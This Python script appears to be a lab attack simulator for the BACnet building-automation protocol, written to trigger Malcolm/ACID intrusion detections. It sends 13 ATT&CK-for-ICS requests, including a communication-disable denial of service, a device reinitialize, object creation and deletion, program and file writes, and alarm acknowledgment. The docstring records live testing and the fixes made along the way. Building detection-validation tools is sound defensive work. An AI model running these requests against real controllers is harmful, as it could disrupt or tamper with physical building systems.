"""BACnet ICS attack simulator — triggers Malcolm ACID ATT&CK for ICS detections
for BACnet, the richest-covered protocol in ACID (13 techniques, all matched by
literal BACnet service name rather than raw class/service byte pairs like
S7comm/CIP — see `ACID_bacnet_detect.zeek`'s `mDOTS_config_change` table).

Every technique below issues its exact request directly via bacpypes3's
`Application.request()` (or BAC0's own `who_is()`/`reinitialize()` convenience
wrappers), rather than BAC0's higher-level read/write helpers — most of these
services (Device-Communication-Control, Create/Delete-Object, Add/Remove-List-
Element, Atomic-Read/Write-File, (Un)Confirmed-Private-Transfer, Acknowledge-
Alarm, Who-Has) have no BAC0 convenience method at all.

Confirmed live 2026-07-04 against a real bacnet_server.py instance (round-trip,
not guessed): every one of these 13 requests encodes and transmits cleanly.
The simulator's minimal object model (three points: Temperature/Setpoint/
UnitRunning, no File/Program objects, no editable object database) means most
of them come back as an application-layer Reject ("unrecognized-service") or
Error ("unknown-object") rather than a real Ack — but that doesn't matter for
detection: ACID is a passive Zeek analyzer, watching for the service choice on
the wire, not for whether the device's reply was a success. A reject still
proves the request itself was a well-formed, correctly-encoded APDU of exactly
the service type ACID's table is looking for. Only Subscribe-COV, Who-Is/I-Am,
and Read-Property get genuine Acks against this simulator (it does support
those object/COV services for its own three real points).

Confirmed live 2026-07-04 against a REAL Malcolm deployment (not just the local
dev simulator above): 6 of 13 fire with a real, correctly-mapped
`threat.technique.id` — T0801, T0814, T0835, T0836, T0845, T0858. The other 7
(T0843, T0846, T0855, T0861, T0878, T0888, T0889) either show up in Zeek's own
`bacnet.log` (`zeek.bacnet.pdu_service`) without a matching ACID tag, or aren't
logged by Zeek at all — not yet root-caused to the same depth as S7comm's
Devices/Upload-Download investigation.

bacpypes3's Error/Reject/Abort PDUs subclass BaseException directly, not
Exception — confirmed live; `except Exception` silently fails to catch them.

FIXED 2026-07-06 (was "known cosmetic side effect, left as-is" here before —
root-caused properly instead of just accepted, after the user asked for a
genuinely clean run). The "AttributeError: no choice" traceback that used to
follow Device-Communication-Control/Reinitialize-Device/Who-Has was NOT
actually connected to those three requests — that was coincidental timing.
Root-caused via a temporary monkeypatch of `bacpypes3.constructeddata.Choice.
encode` (prints the concrete Choice subclass and a stack trace right before
it would raise) run live against bacnet-server: all 3 crashes are US setting
a `Choice`-typed field to a raw value or a `(arm_name, value)` tuple directly
as a request constructor kwarg, which does NOT select an arm of the Choice
(leaves `self._choice` unset) the way actually instantiating the named
`Choice` subclass with the arm as its own kwarg does:
  - `CreateObjectRequest(objectSpecifier=ObjectIdentifier(...))` -> must be
    `objectSpecifier=CreateObjectRequestObjectSpecifier(objectIdentifier=...)`
  - `AcknowledgeAlarmRequest(timeStamp=("time", Time()), ...)` -> must be
    `timeStamp=TimeStamp(time=Time())` (same for `timeOfAcknowledgment`)
  - `WhoHasRequest(object=("objectName", CharacterString(...)))` -> must be
    `object=WhoHasObject(objectName=CharacterString(...))`
(`TimeStamp.as_time()`'s own bacpypes3 source does exactly this —
`cls(time=Time.now(when))` — confirming the arm-as-kwarg form is the real,
supported construction and the tuple/bare-value shorthand never worked.)
Also switched Subscribe-COV to `issueConfirmedNotifications=False` while
investigating (a real, separate, already-known cosmetic issue — this raw
APDU bypasses BAC0's own subscription-context bookkeeping, so confirmed
notifications arriving with no matching context used to log an
"unknown-subscription" exception per notification); harmless to keep even
though it turned out unrelated to the "no choice" crash, and T0801 detection
is unaffected either way (ACID matches the outbound Subscribe-COV *request*,
not which notification form follows).

Usage:
    python3 bacnet_attack.py --target 192.168.50.10 --bind-ip 192.168.100.10
"""

from __future__ import annotations

import argparse
import asyncio
import logging

import BAC0
from bacpypes3.apdu import (
    AcknowledgeAlarmRequest,
    AddListElementRequest,
    AtomicReadFileRequest,
    AtomicWriteFileRequest,
    ConfirmedPrivateTransferRequest,
    CreateObjectRequest,
    DeleteObjectRequest,
    DeviceCommunicationControlRequest,
    SubscribeCOVRequest,
    WhoHasRequest,
    WritePropertyRequest,
)
from bacpypes3.basetypes import (
    AtomicReadFileRequestAccessMethodChoice,
    AtomicReadFileRequestAccessMethodChoiceStreamAccess,
    AtomicWriteFileRequestAccessMethodChoice,
    AtomicWriteFileRequestAccessMethodChoiceStreamAccess,
    CreateObjectRequestObjectSpecifier,
    TimeStamp,
    WhoHasObject,
)
from bacpypes3.pdu import Address
from bacpypes3.primitivedata import CharacterString, ObjectIdentifier, Time, Unsigned

log = logging.getLogger("bacnet_attack")

TEMPERATURE_INSTANCE = 0
UNIT_RUNNING_INSTANCE = 1
SETPOINT_INSTANCE = 2


async def fire(app, dest: Address, label: str, request) -> None:
    """Send one confirmed request and log however the device responds.
    A Reject/Error/timeout is expected and fine here — see module docstring."""
    request.pduDestination = dest
    try:
        result = await asyncio.wait_for(app.request(request), timeout=5.0)
        log.info("%s: accepted (%s)", label, type(result).__name__)
    except asyncio.TimeoutError:
        log.info("%s: sent, no response within timeout (still hit the wire)", label)
    except BaseException as exc:  # noqa: BLE001 — Reject/Error/Abort PDUs, see docstring
        log.info("%s: sent, device responded %s: %s", label, type(exc).__name__, exc)


async def attack(host: str, port: int, bind_host: str, bind_port: int) -> None:
    client = BAC0.lite(ip=bind_host, port=bind_port)
    await asyncio.sleep(0.5)
    app = client.this_application.app
    dest = Address(f"{host}:{port}")

    try:
        log.info("[T0846 Remote System Discovery] Who-Is -> I-Am")
        await app.who_is(address=dest, timeout=3)

        log.info("[T0861 Point & Tag Identification] Read-Property — Temperature")
        temp = await client.read(f"{host}:{port} analogValue {TEMPERATURE_INSTANCE} presentValue")
        log.info("Temperature = %.1f", float(temp))

        await fire(app, dest, "[T0801 Monitor Process State] Subscribe-COV", SubscribeCOVRequest(
            subscriberProcessIdentifier=1,
            monitoredObjectIdentifier=ObjectIdentifier(("analogValue", TEMPERATURE_INSTANCE)),
            issueConfirmedNotifications=False,
            lifetime=10,
        ))

        await fire(app, dest, "[T0814 Denial of Service] Device-Communication-Control", DeviceCommunicationControlRequest(
            timeDuration=60,
            enableDisable="disable",
            password=CharacterString(""),
        ))

        await fire(app, dest, "[T0835 Manipulate I/O Image] Create-Object", CreateObjectRequest(
            objectSpecifier=CreateObjectRequestObjectSpecifier(
                objectIdentifier=ObjectIdentifier(("analogValue", 99))
            ),
        ))
        await fire(app, dest, "[T0835 Manipulate I/O Image] Delete-Object", DeleteObjectRequest(
            objectIdentifier=ObjectIdentifier(("analogValue", 99)),
        ))

        await fire(app, dest, "[T0836 Modify Parameter] Add-List-Element", AddListElementRequest(
            objectIdentifier=ObjectIdentifier(("analogValue", SETPOINT_INSTANCE)),
            propertyIdentifier="priorityArray",
            listOfElements=Unsigned(8),
        ))

        # ACID's exact trigger row: Object type "program", Property "program-change", Value "Load"
        await fire(app, dest, "[T0843 Program Download] Write-Property (program-change=Load)", WritePropertyRequest(
            objectIdentifier=ObjectIdentifier(("program", 1)),
            propertyIdentifier="programChange",
            propertyValue=Unsigned(0),  # enumerated "load"
        ))

        await fire(app, dest, "[T0845 Program Upload] Atomic-Read-File", AtomicReadFileRequest(
            fileIdentifier=ObjectIdentifier(("file", 1)),
            accessMethod=AtomicReadFileRequestAccessMethodChoice(
                streamAccess=AtomicReadFileRequestAccessMethodChoiceStreamAccess(
                    fileStartPosition=0, requestedOctetCount=10
                )
            ),
        ))

        await fire(app, dest, "[T0855 Unauthorized Command Message] Confirmed-Private-Transfer", ConfirmedPrivateTransferRequest(
            vendorID=999,
            serviceNumber=1,
            serviceParameters=None,
        ))

        log.info("[T0858 Change Operating Mode] Reinitialize-Device -> warmstart")
        client.reinitialize(address=f"{host}:{port}", password="", state="warmstart")
        await asyncio.sleep(0.5)

        await fire(app, dest, "[T0878 Alarm Suppression] Acknowledge-Alarm", AcknowledgeAlarmRequest(
            acknowledgingProcessIdentifier=1,
            eventObjectIdentifier=ObjectIdentifier(("binaryValue", UNIT_RUNNING_INSTANCE)),
            eventStateAcknowledged="normal",
            timeStamp=TimeStamp(time=Time.now()),
            acknowledgmentSource=CharacterString("attacker"),
            timeOfAcknowledgment=TimeStamp(time=Time.now()),
        ))

        log.info("[T0888 Remote System Information Discovery] Who-Has")
        who_has = WhoHasRequest(object=WhoHasObject(objectName=CharacterString("Temperature")))
        who_has.pduDestination = dest
        await app.request(who_has)  # unconfirmed — no ack expected

        await fire(app, dest, "[T0889 Modify Program] Atomic-Write-File", AtomicWriteFileRequest(
            fileIdentifier=ObjectIdentifier(("file", 1)),
            accessMethod=AtomicWriteFileRequestAccessMethodChoice(
                streamAccess=AtomicWriteFileRequestAccessMethodChoiceStreamAccess(
                    fileStartPosition=0, fileData=b"x"
                )
            ),
        ))

        log.info("Attack sequence complete.")
    finally:
        client.disconnect()


def main() -> None:
    parser = argparse.ArgumentParser(description="BACnet ACID/ATT&CK ICS attack simulator")
    parser.add_argument("--target", required=True, help="BACnet field device IP (e.g. 192.168.50.10)")
    parser.add_argument("--port", type=int, default=47808)
    parser.add_argument(
        "--bind-ip", required=True,
        help="this attacker's own concrete local IP, never 0.0.0.0 — bacpypes3 fails to "
        "bind its broadcast socket with the wildcard address (confirmed by direct testing). "
        "On kali-1, this is its own lab_ip (192.168.100.10).",
    )
    parser.add_argument("--bind-port", type=int, default=47808)
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
    for noisy in ("BAC0_Root", "bacpypes3"):  # BAC0's actual top-level logger is "BAC0_Root", not "BAC0"
        logging.getLogger(noisy).setLevel(logging.WARNING)
    asyncio.run(attack(args.target, args.port, args.bind_ip, args.bind_port))


if __name__ == "__main__":
    main()
